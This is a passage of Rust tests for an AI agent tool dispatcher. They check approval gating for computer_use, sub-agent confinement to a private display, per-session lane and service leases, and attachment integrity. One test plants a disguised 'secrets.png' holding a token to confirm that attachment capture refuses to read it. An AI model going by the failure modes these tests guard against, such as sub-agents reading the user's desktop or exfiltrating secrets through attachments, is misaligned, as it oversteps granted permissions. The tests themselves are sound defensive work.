    assert!(description.detail().contains("embedded Blu VM"));

    let default_program = crate::BluWorkflowDefinition {
        runtime: crate::WorkflowRuntime::Typescript,
        entrypoint: root.join("flow.ts"),
        command: None,
        args: Vec::new(),
        ..embedded
    };
    assert_eq!(
        describe_workflow_definition(&default_program, root)
            .command
            .as_deref(),
        Some("'bun' '/work/project/flow.ts'")
    );
}

#[tokio::test]
async fn computer_use_requires_approval_even_for_observation() {
    let directory = tempdir().unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        Uuid::new_v4(),
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::Manual,
    );
    for op in [
        "capabilities",
        "list_windows",
        "observe",
        "screenshot",
        "click",
        "set_value",
        "launch",
        "start_display",
    ] {
        let error = dispatcher
            .call("computer_use", json!({"op": op}))
            .await
            .unwrap_err();
        assert!(
            error
                .to_string()
                .contains("requires Full Access or explicit approval")
        );
    }
}

#[tokio::test]
#[cfg(target_os = "linux")]
#[ignore = "requires a live Linux desktop, AT-SPI2, Python, Bun and grim; captures the desktop"]
async fn computer_use_live_desktop_clients() {
    let directory = tempdir().unwrap();
    let session_id = Uuid::new_v4();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let direct = dispatcher
        .call("computer_use", json!({"op": "capabilities"}))
        .await
        .unwrap();
    assert_eq!(direct["desktop_available"], true);
    for (runtime, code) in [
        ("python", "cua.capabilities()"),
        ("javascript", "await cua.capabilities()"),
    ] {
        let result = dispatcher
            .call("runtime_exec", json!({"runtime": runtime, "code": code}))
            .await
            .unwrap();
        assert_eq!(result["value"], direct);
    }
    for (runtime, code) in [
        ("python", "cua.screenshot(\"desktop\")"),
        ("javascript", "await cua.screenshot(\"desktop\")"),
    ] {
        let result = dispatcher
            .call("runtime_exec", json!({"runtime": runtime, "code": code}))
            .await
            .unwrap();
        assert_eq!(result["value"]["scope"], "desktop");
        assert!(
            result["value"]["width"]
                .as_u64()
                .is_some_and(|width| width > 0)
        );
        assert_eq!(result["borg_attachments"][0]["media_type"], "image/png");
        assert!(
            result["borg_attachments"][0]["data_base64"]
                .as_str()
                .is_some_and(|image| !image.is_empty())
        );
        assert!(result["value"].get("borg_attachments").is_none());
    }
    // The concatenated helper (compositor prologue + AT-SPI worker) boots and
    // lists windows through the dispatcher and both code-mode clients.
    for (runtime, code) in [
        ("python", "cua.list_windows()"),
        ("javascript", "await cua.list_windows()"),
    ] {
        let result = dispatcher
            .call("runtime_exec", json!({"runtime": runtime, "code": code}))
            .await
            .unwrap();
        assert!(result["value"]["windows"].is_array());
        assert!(result["value"].get("window_backend").is_some());
    }
    dispatcher
        .persistent_runtimes
        .stop_session(session_id)
        .await;
}

/// Failure mode: a sub-agent reading or driving the user's desktop through
/// computer_use -- listing desktop windows, capturing the screen, or injecting
/// input into the user's focused window -- instead of its private display.
#[tokio::test]
async fn a_sub_agent_computer_use_is_confined_to_a_private_display() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (_scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        Arc::new(store),
    )
    .unwrap();
    let dispatcher_for = |actor| {
        AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            Some(coordinator.clone()),
            crate::LspService::new(directory.path()),
            CodingProvider::Codex,
            actor,
            true,
            None,
            None,
            directory.path().to_path_buf(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        )
    };
    let display_enum = |dispatcher: &AgentToolDispatcher| {
        dispatcher
            .specs()
            .into_iter()
            .find(|spec| spec["name"] == "computer_use")
            .expect("computer_use is advertised")["inputSchema"]["properties"]["display"]["enum"]
            .clone()
    };
    const REFUSAL: &str = "sub-agents may only use their private display";
    let child = dispatcher_for(Uuid::new_v4());
    assert_eq!(display_enum(&child), json!(["private"]));
    let child_properties = child
        .specs()
        .into_iter()
        .find(|spec| spec["name"] == "computer_use")
        .expect("computer_use is advertised")["inputSchema"]["properties"]
        .clone();
    assert!(
        child_properties.get("restore_focus").is_none(),
        "a child cannot move the user's desktop focus"
    );
    for desktop in [
        json!({"op": "list_windows"}),
        json!({"op": "screenshot", "scope": "desktop"}),
        json!({"op": "observe", "window_id": "a1b2:3"}),
        json!({"op": "type_text", "window_id": "niri:17", "text": "x"}),
        json!({"op": "pointer_click", "x": 10, "y": 10}),
        json!({"op": "screenshot", "scope": "window", "window_id": "niri:17"}),
        json!({"op": "pointer_move", "window_id": "niri:17", "dx": 40, "dy": 0}),
    ] {
        let error = child
            .call("computer_use", desktop.clone())
            .await
            .unwrap_err();
        assert!(error.to_string().contains(REFUSAL), "{desktop}: {error}");
    }
    // Private-display ops pass the confinement (the helper may still be
    // unavailable on a host without a desktop session).
    if let Err(error) = child
        .call(
            "computer_use",
            json!({"op": "list_windows", "display": "private"}),
        )
        .await
    {
        assert!(!error.to_string().contains(REFUSAL), "{error}");
    }
    child
        .persistent_runtimes
        .stop_session(child.actor_session_id)
        .await;

    let director = dispatcher_for(root);
    assert_eq!(display_enum(&director), json!(["desktop", "private"]));
    if let Err(error) = director
        .call("computer_use", json!({"op": "capabilities"}))
        .await
    {
        assert!(!error.to_string().contains(REFUSAL), "{error}");
    }
    director
        .persistent_runtimes
        .stop_session(director.actor_session_id)
        .await;
}

/// Failure mode: a sub-agent acting on lanes/services with its parent's
/// identity -- its parent's service lease or jobs -- because identity came
/// from anything but its own session.
#[tokio::test]
#[cfg(unix)]
async fn a_sub_agent_cannot_use_its_parents_lane_or_service_identity() {
    use crate::lane_tools::tests::{fixture_tools, write_test_service};
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (_scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        Arc::new(store),
    )
    .unwrap();
    let (_lanes_dir, lanes, project) = fixture_tools();
    // The parent's session holds the editor lease.
    let parent_identity = crate::lane_tools::Caller {
        participant_id: root,
        session_id: root,
    };
    write_test_service(&lanes.root, &project, Some(&parent_identity));
    let dispatcher_for = |actor| {
        AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            Some(coordinator.clone()),
            crate::LspService::new(directory.path()),
            CodingProvider::Codex,
            actor,
            true,
            None,
            None,
            directory.path().to_path_buf(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        )
        .with_lane_tools(lanes.clone())
    };
    let child = dispatcher_for(Uuid::new_v4());
    for name in ["lane_job", "lane_service"] {
        assert!(child.specs().iter().any(|spec| spec["name"] == name));
    }
    let error = child
        .call(
            "lane_service",
            json!({"op": "read", "id": "editor", "path": "/capture"}),
        )
        .await
        .unwrap_err();
    assert!(error.to_string().contains("read needs a lease"), "{error}");
    let error = child
        .call(
            "lane_service",
            json!({"op": "lease", "id": "editor", "owner": root.to_string()}),
        )
        .await
        .unwrap_err();
    assert!(error.to_string().contains("cannot be supplied"), "{error}");
    // Another session's exclusive waits on the parent's lease: the child
    // sees that wait, but never the parent's participant or session id.
    crate::lane_tools::tests::plant_foreign_wait(
        &lanes.root,
        &crate::lane_tools::tests::caller(5),
        &parent_identity,
    );
    let status = child
        .call("lane_service", json!({"op": "status", "id": "editor"}))
        .await
        .unwrap();
    assert_eq!(status["clients"][0]["yours"], false);
    let shown = status.to_string();
    assert!(shown.contains("holder another agent "), "{shown}");
    assert!(!shown.contains(&root.to_string()), "{shown}");

    // The parent's own session passes the lease check (the read then fails
    // only because no service is listening in this fixture).
    let parent = dispatcher_for(root);
    let status = parent
        .call("lane_service", json!({"op": "status", "id": "editor"}))
        .await
        .unwrap();
    assert_eq!(status["clients"][0]["yours"], true);
    assert!(
        status["reason"]
            .as_str()
            .unwrap()
            .contains("holder you until"),
        "{status}"
    );
    let error = parent
        .call(
            "lane_service",
            json!({"op": "read", "id": "editor", "path": "/capture"}),
        )
        .await
        .unwrap_err();
    assert!(!error.to_string().contains("needs a lease"), "{error}");
}

/// Failure mode: the model-facing lane path not running a registered job
/// end to end, or leaking one session's job to another.
#[tokio::test]
#[cfg(target_os = "linux")]
#[ignore = "requires BORG_LANE_EXECUTABLE (a built borg) and a systemd user session"]
async fn lane_jobs_run_from_registered_templates_as_the_calling_session() {
    use crate::lane_tools::tests::{fixture_tools, register_template, spec};
    let executable = std::env::var_os("BORG_LANE_EXECUTABLE").map(std::path::PathBuf::from);
    let (_lanes_dir, lanes, project) = fixture_tools();
    let lanes = crate::lane_tools::LaneTools::new(lanes.root, lanes.templates, executable);
    let mut job = spec(&project, borg_lanes::lanes::Access::Shared { slots: 1 });
    job.argv
        .extend(["-c".into(), "echo built by a lane".into()]);
    register_template(&lanes.templates, "build", job);
    let dispatcher_for = |actor| {
        AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            None,
            crate::LspService::new(&project),
            CodingProvider::Codex,
            actor,
            false,
            None,
            None,
            project.clone(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        )
        .with_lane_tools(lanes.clone())
    };
    let session = dispatcher_for(Uuid::new_v4());
    let submitted = session
        .call(
            "lane_job",
            json!({"op": "submit", "adapter": "native", "template": "build"}),
        )
        .await
        .unwrap();
    let job_id = submitted["job_id"].as_str().unwrap().to_string();
    let waited = session
        .call(
            "lane_job",
            json!({"op": "wait", "job_id": job_id, "timeout_seconds": 60}),
        )
        .await
        .unwrap();
    assert_eq!(
        waited["state"],
        json!({"Finished": {"exit_code": 0}}),
        "{waited}"
    );
    let log = std::fs::read_to_string(waited["log_path"].as_str().unwrap()).unwrap();
    assert!(log.contains("built by a lane"), "{log}");
    let listed = session
        .call("lane_job", json!({"op": "list"}))
        .await
        .unwrap();
    assert_eq!(listed["jobs"][0]["job_id"], json!(job_id));
    let other = dispatcher_for(Uuid::new_v4());
    let error = other
        .call("lane_job", json!({"op": "status", "job_id": job_id}))
        .await
        .unwrap_err();
    assert!(
        error.to_string().contains("not one of your session's jobs"),
        "{error}"
    );

    // watch=true hands completion to the session's watchers: no polling.
    let watcher_session = Uuid::new_v4();
    let (events, mut received) = tokio::sync::mpsc::channel(8);
    let watched = dispatcher_for(watcher_session).with_watches(crate::watch::Watches::new(
        crate::native_process::ProcessManager::default(),
        events,
        watcher_session,
    ));
    let submitted = watched
        .call(
            "lane_job",
            json!({"op": "submit", "adapter": "native", "template": "build", "watch": true}),
        )
        .await
        .unwrap();
    assert!(submitted["watch"]["watch_id"].is_string(), "{submitted}");
    let event = tokio::time::timeout(std::time::Duration::from_secs(60), received.recv())
        .await
        .expect("the lane watcher reports the job's exit")
        .unwrap();
    assert!(event.contains("lane job"), "{event}");
    assert!(event.contains("Finished"), "{event}");
}

/// Backend for the live lane-service test below: this test binary re-executed
/// as a minimal HTTP server; `/` reports its pid, other paths answer `ok`.
#[test]
#[cfg(target_os = "linux")]
#[ignore = "fake HTTP backend; launched by lane_service_leases_belong_to_the_calling_session_live"]
fn fake_http_backend() {
    use std::io::{BufRead, Write};
    if std::env::var_os("BORG_TEST_FAKE_HTTP_BACKEND").is_none() {
        return;
    }
    let port: u16 = std::env::args().next_back().unwrap().parse().unwrap();
    let listener = std::net::TcpListener::bind(("127.0.0.1", port)).unwrap();
    for mut stream in listener.incoming().flatten() {
        std::thread::spawn(move || {
            let mut reader = std::io::BufReader::new(stream.try_clone().unwrap());
            let mut request = String::new();
            let _ = reader.read_line(&mut request);
            let mut header = String::new();
            while reader.read_line(&mut header).is_ok_and(|read| read > 2) {
                header.clear();
            }
            let body = if request.split_whitespace().nth(1) == Some("/") {
                format!("pid={}\n", std::process::id())
            } else {
                "ok\n".to_string()
            };
            let _ = write!(
                stream,
                "HTTP/1.0 200 OK\r\ncontent-length: {}\r\n\r\n{body}",
                body.len()
            );
        });
    }
}

/// Failure mode: a real supervised service accepting one session's lease,
/// restart or capture read on behalf of another.
#[tokio::test]
#[cfg(target_os = "linux")]
#[ignore = "requires BORG_LANE_EXECUTABLE (a built borg)"]
async fn lane_service_leases_belong_to_the_calling_session_live() {
    use crate::lane_tools::tests::fixture_tools;
    let executable = std::path::PathBuf::from(std::env::var_os("BORG_LANE_EXECUTABLE").unwrap());
    let backend = std::env::current_exe().unwrap();
    let (_lanes_dir, lanes, project) = fixture_tools();
    let lanes =
        crate::lane_tools::LaneTools::new(lanes.root, lanes.templates, Some(executable.clone()));
    let ports: Vec<u16> = (0..3)
        .map(|_| {
            std::net::TcpListener::bind("127.0.0.1:0")
                .unwrap()
                .local_addr()
                .unwrap()
                .port()
        })
        .collect();
    let cli = |args: &[&str]| {
        let output = std::process::Command::new(&executable)
            .args(["lane", "--state-dir"])
            .arg(&lanes.root)
            .arg("--json")
            .args(args)
            .env("BORG_LANE_SCOPE", "0")
            .env("BORG_LANE_DEGRADED", "1")
            .env("BORG_LANE_EXECUTABLE", &executable)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };
    let resource = format!("bridge-editor-{}", Uuid::new_v4().simple());
    cli(&[
        "resource",
        "set-capacity",
        "--name",
        &resource,
        "--slots",
        "1",
    ]);
    let spec = json!({
        "id": "editor",
        "argv": [backend, "--exact", "subagents::tests::fake_http_backend",
                 "--include-ignored", "--quiet", "{port}"],
        "cwd": project, "env": [["BORG_TEST_FAKE_HTTP_BACKEND", "1"]],
        "resources": [{"key": {"scope": "Host", "name": resource}, "access": {"Shared": {"slots": 1}}}],
        "adapter_enforces_leases": false, "read_only_paths": ["/", "/health"],
        "memory_max_bytes": 134217728,
        "admission": {"min_available_ram_bytes": 0, "reserve_ram_bytes": 0,
                      "min_free_disk_bytes": 0, "reserve_disk_bytes": 0, "disk_path": project},
        "health": {"argv": ["/health"], "kind": "http", "interval_ms": 100, "timeout_ms": 1000},
        "restart": {"max_restarts": 3, "backoff_ms": 100, "debounce_ms": 100},
        "endpoint": {"listen": format!("127.0.0.1:{}", ports[0]), "backend_ports": [ports[1], ports[2]]},
        "restore": null
    });
    let definition = project.join("service.json");
    std::fs::write(&definition, spec.to_string()).unwrap();
    cli(&[
        "service",
        "start",
        "editor",
        "--definition",
        definition.to_str().unwrap(),
    ]);

    let dispatcher_for = |actor| {
        AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            None,
            crate::LspService::new(&project),
            CodingProvider::Codex,
            actor,
            false,
            None,
            None,
            project.clone(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        )
        .with_lane_tools(lanes.clone())
    };
    let (a, b) = (
        dispatcher_for(Uuid::new_v4()),
        dispatcher_for(Uuid::new_v4()),
    );
    let service = |args: Value| {
        json!({"id": "editor"})
            .as_object()
            .unwrap()
            .clone()
            .into_iter()
            .chain(args.as_object().unwrap().clone())
            .collect::<serde_json::Map<String, Value>>()
    };
    let leased = a
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "lease", "purpose": "capture"}))),
        )
        .await
        .unwrap();
    assert_eq!(leased["clients"][0]["yours"], true, "{leased}");
    let refused = b
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "lease"}))),
        )
        .await
        .unwrap_err();
    assert!(
        format!("{refused:#}").contains("another owner"),
        "{refused:#}"
    );
    let refused = b
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "read", "path": "/"}))),
        )
        .await
        .unwrap_err();
    assert!(refused.to_string().contains("needs a lease"), "{refused}");
    let read = a
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "read", "path": "/"}))),
        )
        .await
        .unwrap();
    assert_eq!(read["status"], 200, "{read}");
    assert!(read["body"].as_str().unwrap().starts_with("pid="), "{read}");
    let released = a
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "release"}))),
        )
        .await
        .unwrap();
    assert_eq!(released["clients"], json!([]), "{released}");
    let leased = b
        .call(
            "lane_service",
            Value::Object(service(json!({"op": "lease"}))),
        )
        .await
        .unwrap();
    assert_eq!(leased["clients"][0]["yours"], true, "{leased}");
    b.call(
        "lane_service",
        Value::Object(service(json!({"op": "release"}))),
    )
    .await
    .unwrap();
    cli(&["service", "stop", "editor"]);
}

/// Failure mode: private-display input or lifetime leaking onto the user's
/// machine -- an app driven through the uinput seat, or an app and its
/// compositor outliving the session that launched them.
#[tokio::test]
#[cfg(target_os = "linux")]
#[ignore = "requires a GPU render node, borg-display (BORG_DISPLAY_BIN or PATH), AT-SPI2 and vkcube"]
async fn computer_use_live_private_display() {
    let directory = tempdir().unwrap();
    let session_id = Uuid::new_v4();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let call = |arguments: Value| dispatcher.call("computer_use", arguments);
    let launched = call(
        json!({"op": "launch", "argv": ["vkcube", "--wsi", "wayland"],
        "width": 800, "height": 600}),
    )
    .await
    .unwrap();
    assert_eq!(launched["display"]["gpu_accelerated"], true, "{launched}");
    let pid = launched["pid"].as_i64().unwrap() as i32;
    let window_id = launched["windows"][0]["id"].as_str().unwrap().to_string();
    assert!(window_id.starts_with("pd:"), "{launched}");
    let clicked = call(json!({"op": "pointer_click", "window_id": window_id, "x": 400, "y": 300}))
        .await
        .unwrap();
    assert_eq!(clicked["dispatched"], true);
    let shot = call(json!({"op": "screenshot", "scope": "window", "window_id": window_id}))
        .await
        .unwrap();
    assert_eq!(
        (shot["width"].as_u64(), shot["height"].as_u64()),
        (Some(800), Some(600))
    );
    assert_eq!(shot["borg_attachments"][0]["media_type"], "image/png");
    for (runtime, code) in [
        ("python", "cua.list_windows('private')"),
        ("javascript", "await cua.list_windows('private')"),
    ] {
        let listed = dispatcher
            .call("runtime_exec", json!({"runtime": runtime, "code": code}))
            .await
            .unwrap();
        assert_eq!(
            listed["value"]["windows"][0]["id"],
            window_id.as_str(),
            "{listed}"
        );
    }
    let devices = std::fs::read_to_string("/proc/bus/input/devices").unwrap();
    assert!(
        !devices.contains("Borg virtual input"),
        "private input used uinput"
    );
    dispatcher
        .persistent_runtimes
        .stop_session(session_id)
        .await;
    assert_eq!(
        unsafe { libc::kill(pid, 0) },
        -1,
        "launched app survived the session"
    );
}

/// Settling a delivery at the session projection must not turn a worker's own
/// `acknowledge_team_message` into an error.
///
/// The projection now admits a team message as soon as the child journals it
/// as complete, so by the time the worker acknowledges, the delivery is no
/// longer pending. The ack lookup searches only the pending set, so an
/// already-admitted message reports "unread team message not found" -- a
/// worker that did exactly what it was told is told it imagined the message.
#[tokio::test]
async fn acknowledging_an_already_admitted_team_message_is_idempotent() {
    let directory = tempdir().unwrap();
    let root = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    store.create_session(root).await.unwrap();
    let coordinator = SubagentCoordinator::new_with_store_and_executor(
        directory.path(),
        root,
        launch(),
        3,
        Arc::new(crate::LocalAgentTurnExecutor::default()),
        store.clone(),
    )
    .unwrap();
    let worker = coordinator
        .table
        .lock()
        .await
        .reserve("worker", &launch())
        .unwrap();
    bind_test_team(directory.path(), store.as_ref(), root, &[worker.session_id]).await;

    let workspace_store = coordinator.workspace_store().await.unwrap();
    let binding = store
        .workspace_binding(worker.session_id)
        .await
        .unwrap()
        .unwrap();
    let director = store
        .workspace_binding(root)
        .await
        .unwrap()
        .unwrap()
        .participant_id;
    let receipt = workspace_store
        .append_message(crate::NewWorkspaceMessage {
            workspace_id: binding.workspace_id,
            author_id: director,
            text: "freeze the build".to_string(),
            mentions: Vec::new(),
            attachments: Vec::new(),
            audience: crate::Audience::Direct {
                participant: binding.participant_id,
            },
            mode: crate::DeliveryMode::Boundary,
            thread_id: None,
            reply_to_message_id: None,
            idempotency_key: "test-freeze".to_string(),
        })
        .await
        .unwrap();
    let message_id = receipt.message_id;

    // What the session projection now does once the child journals the
    // prompt as complete.
    workspace_store
        .transition_message_delivery(
            binding.workspace_id,
            message_id,
            binding.participant_id,
            crate::DeliveryState::Admitted,
            None,
        )
        .await
        .unwrap();

    coordinator
        .acknowledge_message_for_session(worker.session_id, message_id)
        .await
        .expect("acknowledging an admitted team message must succeed");
    assert_eq!(
        workspace_store
            .message_deliveries(message_id)
            .await
            .unwrap()
            .into_iter()
            .find(|delivery| delivery.recipient_id == binding.participant_id)
            .unwrap()
            .state,
        crate::DeliveryState::Acknowledged
    );

    // A second ack is a no-op, not a failure.
    coordinator
        .acknowledge_message_for_session(worker.session_id, message_id)
        .await
        .expect("acknowledgement must be idempotent");
    scratch.discard().await;
}

/// Failure mode: the sender wrote `BORG_AGENT_TOOL_PROVIDER` in kebab-case while
/// `borg __agent-mcp` parses snake_case, so the tool server exited at startup and
/// the session silently lost every `mcp__borg_agent__*` tool.
#[tokio::test]
async fn agent_tool_provider_environment_parses_back_for_every_provider() {
    for provider in [
        CodingProvider::Codex,
        CodingProvider::Claude,
        CodingProvider::OpenCode,
        CodingProvider::Kimi,
        CodingProvider::Glm,
        CodingProvider::OpenRouter,
        CodingProvider::OpenAiCompatible,
    ] {
        let directory = tempdir().unwrap();
        let dispatcher = AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            None,
            crate::LspService::new(directory.path()),
            provider,
            Uuid::new_v4(),
            false,
            None,
            None,
            directory.path().to_path_buf(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        );
        let server = AgentToolServer::start(directory.path(), Uuid::new_v4(), dispatcher)
            .await
            .expect("the agent tool server starts");
        let external = server
            .external_mcp_server()
            .expect("the MCP server description is produced");
        let sent = external
            .env
            .get("BORG_AGENT_TOOL_PROVIDER")
            .expect("the provider is always passed to the tool server")
            .clone();

        let parsed: CodingProvider = serde_json::from_value(serde_json::Value::String(
            sent.clone(),
        ))
        .unwrap_or_else(|error| {
            panic!(
                "{provider:?} sends BORG_AGENT_TOOL_PROVIDER={sent:?}, which \
                         `borg __agent-mcp` rejects: {error}"
            )
        });
        assert_eq!(
            parsed, provider,
            "{sent:?} must round trip back to the provider that sent it"
        );
    }
}

#[tokio::test]
async fn watcher_yield_is_hidden_and_rejected_until_opted_in() {
    let directory = tempdir().unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        Uuid::new_v4(),
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let args = json!({"watch_ids": [Uuid::new_v4()], "reason": "build is running"});
    let error = dispatcher.call("await_watchers", args).await.unwrap_err();
    assert!(error.to_string().contains("watcher yield is disabled"));
    assert!(
        !dispatcher
            .specs()
            .iter()
            .any(|tool| tool["name"] == "await_watchers")
    );
    assert!(
        dispatcher
            .specs()
            .iter()
            .any(|tool| tool["name"] == "watch")
    );

    let enabled = dispatcher.with_watcher_yield(true);
    let server = AgentToolServer::start(directory.path(), Uuid::new_v4(), enabled)
        .await
        .unwrap();
    let external = server.external_mcp_server().unwrap();
    assert!(
        external
            .allowed_tools
            .iter()
            .any(|name| name == "mcp__borg_agent__await_watchers")
    );
}

/// One-pixel PNG, small but a genuine PNG signature.
fn sample_png() -> Vec<u8> {
    let mut bytes = vec![0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
    bytes.extend_from_slice(b"fake IDAT payload for tests");
    bytes
}

/// The whole point of capturing bytes rather than forwarding a path: the
/// message has to still deliver the real image once the sender's file is gone.
/// A path-carrying design passes every test until exactly this moment.
#[tokio::test]
async fn a_forwarded_image_replays_from_captured_bytes_after_the_original_is_deleted() {
    let root = tempdir().expect("journal root");
    let source = root.path().join("evidence.png");
    let original = sample_png();
    std::fs::write(&source, &original).expect("write source image");

    let captured = capture_message_attachments(root.path(), std::slice::from_ref(&source))
        .await
        .expect("capture image");
    assert_eq!(captured.len(), 1);
    assert_eq!(captured[0].media_type, "image/png");
    assert_eq!(captured[0].byte_len, original.len() as u64);
    assert_eq!(captured[0].name, "evidence.png");
    // The durable reference must not smuggle the sender's location.
    let reference = serde_json::to_string(&captured[0]).expect("serialize reference");
    assert!(
        !reference.contains(source.to_str().expect("utf-8 path")),
        "durable reference leaked the sender's path: {reference}"
    );

    std::fs::remove_file(&source).expect("delete the sender's original");

    let resolved = resolve_message_attachments(root.path(), &captured)
        .await
        .expect("replay must not depend on the sender's file");
    assert_eq!(resolved.len(), 1);
    assert_eq!(
        std::fs::read(&resolved[0]).expect("read replayed image"),
        original,
        "replay delivered different bytes than were captured"
    );
}

/// Verification exists so a damaged blob fails loudly instead of being handed
/// to a model as though it were the sender's image.
#[tokio::test]
async fn a_tampered_attachment_fails_verification_instead_of_being_delivered() {
    let root = tempdir().expect("journal root");
    let source = root.path().join("shot.png");
    std::fs::write(&source, sample_png()).expect("write source image");
    let captured = capture_message_attachments(root.path(), &[source])
        .await
        .expect("capture image");

    let blob = attachment_blob_path(root.path(), &captured[0]);
    let mut corrupted = sample_png();
    corrupted.extend_from_slice(b"appended by something else");
    std::fs::write(&blob, corrupted).expect("corrupt the stored blob");

    let error = resolve_message_attachments(root.path(), &captured)
        .await
        .expect_err("a blob that no longer matches its digest must not be delivered");
    let error = format!("{error:#}");
    assert!(
        error.contains("integrity verification") || error.contains("recorded"),
        "unexpected error: {error}"
    );

    // A blob that is simply missing must fail too, rather than silently
    // delivering a message with its images dropped.
    std::fs::remove_file(&blob).expect("remove blob");
    assert!(
        resolve_message_attachments(root.path(), &captured)
            .await
            .is_err(),
        "a missing blob must fail the message, not drop the image"
    );
}

/// The capture boundary is what stops a message attachment from becoming a
/// way to read arbitrary files, so it refuses on content rather than on name.
#[tokio::test]
async fn attachment_capture_refuses_non_images_and_oversized_and_overlong_sets() {
    let root = tempdir().expect("journal root");

    // A non-image renamed to look like one is still not an image.
    let disguised = root.path().join("secrets.png");
    std::fs::write(&disguised, b"BORG_TOKEN=supersecret\n").expect("write disguised file");
    let error = format!(
        "{:#}",
        capture_message_attachments(root.path(), &[disguised])
            .await
            .expect_err("a non-image must be refused on content, not trusted by extension")
    );
    assert!(error.contains("PNG or JPEG"), "unexpected error: {error}");

    // A directory is not a regular file.
    let directory = root.path().join("a_directory.png");
    std::fs::create_dir(&directory).expect("create directory");
    assert!(
        capture_message_attachments(root.path(), &[directory])
            .await
            .is_err(),
        "a directory must not be captured as an image"
    );

    // Oversized content is refused before it can reach anyone's context.
    let oversized = root.path().join("huge.png");
    let mut big = sample_png();
    big.resize(MAX_MESSAGE_ATTACHMENT_BYTES as usize + 1, 0);
    std::fs::write(&oversized, &big).expect("write oversized image");
    assert!(
        capture_message_attachments(root.path(), &[oversized])
            .await
            .is_err(),
        "an oversized image must be refused"
    );

    // More attachments than the channel accepts.
    let mut many = Vec::new();
    for index in 0..=MAX_MESSAGE_ATTACHMENTS {
        let path = root.path().join(format!("shot{index}.png"));
        std::fs::write(&path, sample_png()).expect("write image");
        many.push(path);
    }
    assert!(
        capture_message_attachments(root.path(), &many)
            .await
            .is_err(),
        "more than {MAX_MESSAGE_ATTACHMENTS} attachments must be refused"
    );
}

/// Journals written before image forwarding must keep replaying. A body that
/// fails to deserialize would strand every earlier message in the workspace.
#[test]
fn a_message_body_written_before_image_forwarding_still_replays() {
    let body: crate::WorkspaceMessageBody =
        serde_json::from_str(r#"{"text":"older message","mentions":[]}"#)
            .expect("bodies written before attachments must still deserialize");
    assert_eq!(body.text, "older message");
    assert!(body.attachments.is_empty());
}

/// Build two rooted sessions sharing one workspace, plus a coordinator.
async fn image_routing_fixture(
    directory: &std::path::Path,
) -> (
    SubagentCoordinator,
    Uuid,
    Uuid,
    Arc<crate::session_store::postgres::PostgresSessionStore>,
    crate::session_store::postgres::testing::ScratchDatabase,
) {
    let sender = Uuid::new_v4();
    let recipient = Uuid::new_v4();
    let workspace_id = Uuid::new_v4();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let store = Arc::new(store);
    for session in [sender, recipient] {
        store
            .create_session_in_workspace(session, workspace_id)
            .await
            .unwrap();
    }
    let workspace = store.workspace_store().await.unwrap().unwrap();
    let human = crate::local_human_participant_id("Human");
    for (session, label) in [(sender, "Sender root"), (recipient, "Recipient root")] {
        workspace
            .ensure_execution_workspace(
                workspace_id,
                "shared project",
                human,
                "Human",
                session,
                label,
            )
            .await
            .unwrap();
    }
    // Both sessions record the SAME host. That is one of the three things the
